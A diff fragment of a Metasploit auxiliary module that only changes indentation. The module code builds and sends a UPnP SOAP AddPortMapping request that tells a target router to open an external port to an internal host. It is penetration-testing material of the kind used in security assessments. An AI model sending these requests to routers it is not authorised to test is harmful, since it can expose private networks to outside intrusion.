@@ -32,10 +32,10 @@ class Metasploit3 < Msf::Auxiliary
           content = "<?xml version=\"1.0\"?>"
           content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
           content << "<SOAP-ENV:Body>"
-     	    content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
-     	    content << "<NewPortMappingDescription>New Port Mapping</NewPortMappingDescription>"
-     	    content << "<NewLeaseDuration>3600</NewLeaseDuration>"
-     	    content << "<NewInternalClient>#{datastore['INTERNAL_CLIENT']}</NewInternalClient>"
+     	  content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
+     	  content << "<NewPortMappingDescription>New Port Mapping</NewPortMappingDescription>"
+     	  content << "<NewLeaseDuration>3600</NewLeaseDuration>"
+     	  content << "<NewInternalClient>#{datastore['INTERNAL_CLIENT']}</NewInternalClient>"
       	  content << "<NewEnabled>1</NewEnabled>"
       	  content << "<NewExternalPort>#{datastore['EXTERNAL_PORT']}</NewExternalPort>"
       	  content << "<NewRemoteHost></NewRemoteHost>"
@@ -47,14 +47,14 @@ class Metasploit3 < Msf::Auxiliary
 
           contentlen = content.length
 
- 	        header =  "POST http://#{rhost}:#{rport}/#{ctrlurl} HTTP/1.0\r\n"
- 	        header << "Content-Type: text/xml;charset=\"utf-8\"\r\n"
- 	        header << "SOAPAction: #{soapaction}\n\r"
- 	        header << "User-Agent: SOAP AddPortMapping Metasploit Module\r\n"
- 	        header << "Host: #{rhost}:#{rport}\r\n"
- 	        header << "Content-Length: #{contentlen}\r\n"
- 	        header << "\r\n"
- 	        header << content
+ 	  header =  "POST http://#{rhost}:#{rport}/#{ctrlurl} HTTP/1.0\r\n"
+ 	  header << "Content-Type: text/xml;charset=\"utf-8\"\r\n"
+ 	  header << "SOAPAction: #{soapaction}\n\r"
+ 	  header << "User-Agent: SOAP AddPortMapping Metasploit Module\r\n"
+ 	  header << "Host: #{rhost}:#{rport}\r\n"
+ 	  header << "Content-Length: #{contentlen}\r\n"
+ 	  header << "\r\n"
+ 	  header << content
 
           print_status("Sending SOAP Request")
           connect()
